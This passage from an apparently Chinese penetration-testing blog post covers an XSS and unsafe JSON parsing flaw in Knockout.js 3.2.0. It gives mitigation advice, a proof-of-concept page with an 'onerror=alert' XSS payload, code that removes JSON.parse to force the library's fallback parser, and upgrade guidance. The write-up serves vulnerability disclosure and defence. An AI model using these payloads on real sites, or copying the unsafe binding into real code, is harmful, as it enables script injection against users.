</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="err">避免使用</span><span class="n">html绑定</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="err">除非完全信任数据源，否则应使用</span><span class="n">text绑定替代html绑定</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="err">升级</span><span class="n">Knockout</span><span class="o">.</span><span class="n">js版本</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="err">升级到最新版本，可能包含安全修复</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="err">实施内容安全策略</span><span class="p">(</span><span class="n">CSP</span><span class="p">):</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="err">在服务器端配置</span><span class="n">CSP头</span><span class="err">，防止内联脚本执行</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="err">输入验证和转义</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="err">对所有用户输入进行验证和</span><span class="n">HTML转义</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="err">使用现代浏览器</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="err">确保用户使用支持</span><span class="n">JSON</span><span class="o">.</span><span class="n">parse的现代浏览器</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="err">创建自定义安全绑定</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="err">实现自己的安全</span><span class="n">HTML绑定</span><span class="err">，对内容进行过滤</span><span class="o">&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">ul</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">测试</span><span class="n">ViewModel</span>
</span></span><span class="line"><span class="cl">        <span class="n">function</span> <span class="n">TestViewModel</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">var</span> <span class="bp">self</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="err">测试用例</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">htmlContent</span> <span class="o">=</span> <span class="n">ko</span><span class="o">.</span><span class="n">observable</span><span class="p">(</span><span class="s1">&#39;&lt;img src=x onerror=alert(&#34;XSS via html binding&#34;)&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">updateHtml</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">//</span> <span class="err">直接更新内容，不做任何转义</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="err">测试用例</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">jsonContent</span> <span class="o">=</span> <span class="n">ko</span><span class="o">.</span><span class="n">observable</span><span class="p">(</span><span class="s1">&#39;{&#34;x&#34;:&#34;y&#34;}&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">jsonParseResult</span> <span class="o">=</span> <span class="n">ko</span><span class="o">.</span><span class="n">observable</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">parseJson</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="o">//</span> <span class="err">保存原始的</span><span class="n">JSON</span><span class="o">.</span><span class="n">parse函数</span>
</span></span><span class="line"><span class="cl">                    <span class="k">var</span> <span class="n">originalJSONParse</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="o">//</span> <span class="err">模拟旧浏览器环境</span> <span class="p">(</span><span class="err">移除</span><span class="n">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">JSON</span><span class="o">.</span><span class="n">parse</span> <span class="o">=</span> <span class="n">undefined</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="o">//</span> <span class="err">尝试解析</span><span class="n">JSON</span>
</span></span><span class="line"><span class="cl">                    <span class="k">var</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ko</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">parseJson</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">jsonContent</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                    <span class="bp">self</span><span class="o">.</span><span class="n">jsonParseResult</span><span class="p">(</span><span class="s1">&#39;解析成功: &#39;</span> <span class="o">+</span> <span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">(</span><span class="n">result</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="o">//</span> <span class="err">恢复原始的</span><span class="n">JSON</span><span class="o">.</span><span class="n">parse函数</span>
</span></span><span class="line"><span class="cl">                    <span class="n">JSON</span><span class="o">.</span><span class="n">parse</span> <span class="o">=</span> <span class="n">originalJSONParse</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="bp">self</span><span class="o">.</span><span class="n">jsonParseResult</span><span class="p">(</span><span class="s1">&#39;解析错误: &#39;</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="o">//</span> <span class="err">确保恢复</span><span class="n">JSON</span><span class="o">.</span><span class="n">parse</span>
</span></span><span class="line"><span class="cl">                    <span class="n">JSON</span><span class="o">.</span><span class="n">parse</span> <span class="o">=</span> <span class="n">originalJSONParse</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">应用绑定</span>
</span></span><span class="line"><span class="cl">        <span class="n">ko</span><span class="o">.</span><span class="n">applyBindings</span><span class="p">(</span><span class="n">new</span> <span class="n">TestViewModel</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">创建一个自定义的安全</span><span class="n">HTML绑定示例</span>
</span></span><span class="line"><span class="cl">        <span class="n">ko</span><span class="o">.</span><span class="n">bindingHandlers</span><span class="o">.</span><span class="n">safeHtml</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">init</span><span class="p">:</span> <span class="n">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">{</span> <span class="s1">&#39;controlsDescendantBindings&#39;</span><span class="p">:</span> <span class="bp">true</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">update</span><span class="p">:</span> <span class="n">function</span><span class="p">(</span><span class="n">element</span><span class="p">,</span> <span class="n">valueAccessor</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">var</span> <span class="n">html</span> <span class="o">=</span> <span class="n">ko</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">unwrapObservable</span><span class="p">(</span><span class="n">valueAccessor</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">html</span> <span class="o">&amp;&amp;</span> <span class="nb">typeof</span> <span class="n">html</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="o">//</span> <span class="err">简单的</span><span class="n">HTML过滤示例</span>
</span></span><span class="line"><span class="cl">                    <span class="k">var</span> <span class="n">safeHtml</span> <span class="o">=</span> <span class="n">html</span>
</span></span><span class="line"><span class="cl">                        <span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/&amp;/</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;&amp;amp;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/&lt;/</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;&amp;lt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/&gt;/</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;&amp;gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span><span class="s2">&#34;/g, &#39;&amp;quot;&#39;)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;/g, &#39;</span><span class="o">&amp;</span><span class="c1">#039;&#39;);</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="n">ko</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">setHtml</span><span class="p">(</span><span class="n">element</span><span class="p">,</span> <span class="n">safeHtml</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="测试">测试</h2>
<p>下载booknockout-3.2.0.debug.js文件，发现parseJson函数允许执行任意JavaScript代码，编写POC进行复现，如图所示：<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250909154117.png" alt="image.png"></p>
<h1 id="漏洞修复">漏洞修复</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">升级Knockout.js版本: 升级到最新版本。
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%89%8B%E6%9C%BA%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%9E%E6%98%BE%E9%AB%98%E5%8D%B1/">
        
        
            <div class="article-image">
                
                    <img src="/images/64.webp" loading="lazy" data-key="" data-hash="/images/64.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【渗透测试】手机验证码回显（高危）</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%9F%E4%B8%80%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%951/">
        
        
            <div class="article-image">
                
                    <img src="/images/65.webp" loading="lazy" data-key="" data-hash="/images/65.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【渗透测试】统一认证系统的挖掘方法1</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%82%AE%E4%BB%B6%E8%BD%B0%E7%82%B8%E4%B8%AD%E5%8D%B1/">
        
        
            <div class="article-image">
                
                    <img src="/images/63.webp" loading="lazy" data-key="" data-hash="/images/63.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【渗透测试】邮件轰炸（中危）</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E6%90%AC%E8%BF%90%E6%A8%AA%E5%90%91%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9--%E7%BA%B5%E5%90%91%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">
        
        
            <div class="article-image">
                
                    <img src="/images/56.webp" loading="lazy" data-key="" data-hash="/images/56.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【搬运】横向短信炸弹 &#43; 纵向短信炸弹 ≈ 任意用户登录</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E5%BC%B1%E5%AF%86%E7%A0%81-%E5%BC%B1%E7%94%A8%E6%88%B7%E5%90%8D%E6%BC%8F%E6%B4%9E%E9%AB%98%E5%8D%B1/">
        
        
            <div class="article-image">
                
                    <img src="/images/57.webp" loading="lazy" data-key="" data-hash="/images/57.webp"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">【渗透测试】通用弱密码&#43;弱用户名漏洞（高危）</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

    
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 Slimer
    </section>
        
    <section class="runtime" style="margin-top:8px;font-size:1.3rem">
        <span id="site-runtime">站点已运行计算中...</span>
    </section>
    <script>
      (function(){
        var sinceStr = '2025-08-25T00:00:00'.replace('T',' ').replace('t',' ');
        var start = new Date(sinceStr);
        function update(){
          var now = new Date();
          var diff = Math.max(0, now - start);
          var days = Math.floor(diff / (24*60*60*1000));
          var hours = Math.floor((diff % (24*60*60*1000)) / (60*60*1000));
          var mins = Math.floor((diff % (60*60*1000)) / (60*1000));
          var secs = Math.floor((diff % (60*1000)) / 1000);
          var el = document.getElementById('site-runtime');
          if(el){ el.textContent = '站点已运行 ' + days + ' 天 ' + hours + ' 小时 ' + mins + ' 分 ' + secs + ' 秒'; }
        }
        update();
        setInterval(update, 1000);
      })();
    </script>
    
	
    <section class="powerby">
        
        
        
    </section>
</footer>




    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.310d38c99963e86c53c43232d9b04e101a98b09425c2fb12195e655db9e34368.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
 <style>
    body {
      background: url(http://localhost:1316/background/bz.webp) no-repeat center top;
      background-size: cover;
      background-attachment: fixed;
      backdrop-filter: blur(50px);
      -webkit-backdrop-filter: blur(50px);  
    }
  </style>

<style>
  @font-face {
    font-family: 'pingfang';
    src: url(http://localhost:1316/font/pingfang.ttf) format('truetype');
  }

  :root {
    --base-font-family: 'pingfang';
    --code-font-family: 'pingfang';
  }
</style>

<script src=http://localhost:1316/background/sakura.js></script>


    </body>
</html>
